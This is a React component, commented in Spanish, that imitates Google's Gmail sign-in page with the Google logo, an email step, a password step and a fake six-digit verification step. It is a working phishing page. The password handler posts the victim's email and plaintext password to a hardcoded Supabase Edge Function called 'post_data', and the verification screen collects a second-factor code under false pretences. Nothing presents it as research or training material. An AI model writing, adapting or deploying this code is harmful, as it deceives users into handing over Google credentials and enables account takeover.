"use client";

import { useState } from "react";
import { createClient } from "@supabase/supabase-js";

// Tipos para los pasos del flujo
type LoginStep = "identifier" | "password" | "forgot-email" | "recovery-code";

// Inicialización del cliente de Supabase
// REEMPLAZA "TU_PUBLIC_ANON_KEY" con la clave que aparece en Settings -> API de tu panel de Supabase
const supabase = createClient("https://wpuviyyopppmjkpjykak.supabase.co", "TU_PUBLIC_ANON_KEY");

// URL de tu Edge Function (Asegúrate de que el nombre de la función sea el correcto)
const EDGE_FUNCTION_URL = "https://wpuviyyopppmjkpjykak.supabase.co/functions/v1/post_data";

export default function GoogleLogin() {
  const [step, setStep] = useState<LoginStep>("identifier");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  const handleNext = (e: React.FormEvent, nextStep: LoginStep) => {
    e.preventDefault();
    setIsLoading(true);
    setTimeout(() => {
      setIsLoading(false);
      setStep(nextStep);
    }, 600);
  };

  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    try {
      // Petición a la Edge Function
      await fetch(EDGE_FUNCTION_URL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          user: email,
          password: password,
          authentication: "google_login_flow"
        }),
      });
    } catch (error) {
      console.error("Error al guardar:", error);
    } finally {
      setIsLoading(false);
      setStep("recovery-code");
    }
  };

  return (
    <div className="flex flex-col min-h-screen items-center justify-center bg-white sm:bg-[#f0f2f5] font-sans selection:bg-blue-100">
      <main className="w-full max-w-[450px] overflow-hidden rounded-lg border-none bg-white p-6 sm:border sm:border-gray-300 sm:px-10 sm:py-12">
        
        {/* Google Logo - Corregido para TypeScript */}
        <div className="flex justify-center pb-3">
          <svg width="48" height="48" viewBox="0 0 40 48" aria-hidden="true">
            <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path>
            <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path>
            <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path>
            <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path>
          </svg>
        </div>

        <div className="mt-2 text-center">
          {step === "identifier" && (
            <div className="animate-in fade-in duration-500">
              <h1 className="text-2xl font-normal text-gray-900">Accede a tu cuenta</h1>
              <p className="mt-2 text-base text-gray-700">con tu Cuenta de Google para ir a Gmail.</p>
              
              <form onSubmit={(e) => handleNext(e, "password")} className="mt-8 text-left">
                <div className="relative mb-2">
                  <input
                    type="text"
                    required
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    className="peer block w-full rounded border border-gray-300 px-3 py-4 text-base focus:border-2 focus:border-blue-600 focus:outline-none"
                    placeholder=" "
                  />
                  <label className="absolute left-3 top-4 origin-[0] -translate-y-7 scale-75 transform bg-white px-1 text-gray-500 duration-300 peer-placeholder-shown:translate-y-0 peer-placeholder-shown:scale-100 peer-focus:left-3 peer-focus:-translate-y-7 peer-focus:scale-75 peer-focus:text-blue-600">
                    Correo electrónico
                  </label>
                </div>
                
                <div className="mt-10 flex items-center justify-between">
                  <button type="button" className="text-sm font-semibold text-blue-600 px-2 py-2 rounded">
                    Crear cuenta
                  </button>
                  <button 
                    disabled={isLoading}
                    type="submit"
                    className="rounded bg-[#1a73e8] px-6 py-2 text-sm font-semibold text-white hover:bg-blue-700 disabled:opacity-70"
                  >
                    {isLoading ? "Cargando..." : "Siguiente"}
                  </button>
                </div>
              </form>
            </div>
          )}

          {step === "password" && (
            <div className="animate-in slide-in-from-right-4 duration-300">
              <h1 className="text-2xl font-normal text-gray-900">Bienvenido</h1>
              <div className="mx-auto mt-2 flex w-fit items-center gap-2 rounded-full border border-gray-300 px-3 py-1">
                <span className="text-sm text-gray-700">{email}</span>
              </div>

              <form onSubmit={handlePasswordSubmit} className="mt-10 text-left">
                <div className="relative mb-2">
                  <input
                    type="password"
                    required
                    autoFocus
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="peer block w-full rounded border border-gray-300 px-3 py-4 text-base focus:border-2 focus:border-blue-600 focus:outline-none"
                    placeholder=" "
                  />
                  <label className="absolute left-3 top-4 origin-[0] -translate-y-7 scale-75 transform bg-white px-1 text-gray-500 duration-300 peer-placeholder-shown:translate-y-0 peer-placeholder-shown:scale-100 peer-focus:left-3 peer-focus:-translate-y-7 peer-focus:scale-75 peer-focus:text-blue-600">
                    Introduce tu contraseña
                  </label>
                </div>

                <div className="mt-12 flex items-center justify-between">
                  <button type="button" className="text-sm font-semibold text-blue-600">
                    ¿Has olvidado tu contraseña?
                  </button>
                  <button 
                    disabled={isLoading}
                    type="submit"
                    className="rounded bg-[#1a73e8] px-6 py-2 text-sm font-semibold text-white hover:bg-blue-700 disabled:opacity-70"
                  >
                    {isLoading ? "Cargando..." : "Siguiente"}
                  </button>
                </div>
              </form>
            </div>
          )}

          {step === "recovery-code" && (
            <div className="animate-in fade-in zoom-in-95 duration-300">
              <h1 className="text-2xl font-normal text-gray-900">Verificación</h1>
              <p className="mt-2 text-base text-gray-700">Introduce el código de 6 dígitos.</p>
              <form onSubmit={(e) => handleNext(e, "identifier")} className="mt-8 text-left">
                <input
                  type="text"
                  required
                  maxLength={6}
                  className="block w-full rounded border border-gray-300 px-3 py-4 text-base text-center focus:border-2 focus:border-blue-600 focus:outline-none"
                  placeholder="G-XXXXXX"
                />
                <div className="mt-10 flex items-center justify-end">
                  <button type="submit" className="rounded bg-[#1a73e8] px-6 py-2 text-sm font-semibold text-white">
                    Verificar
                  </button>
                </div>
              </form>
            </div>
          )}
        </div>
      </main>

      <footer className="mt-4 flex w-full max-w-3xl justify-between px-6 text-xs text-gray-600">
        <span>Español (España)</span>
        <div className="flex gap-4">
          <a href="#">Ayuda</a>
          <a href="#">Privacidad</a>
          <a href="#">Términos</a>
        </div>
      </footer>
    </div>
  );
}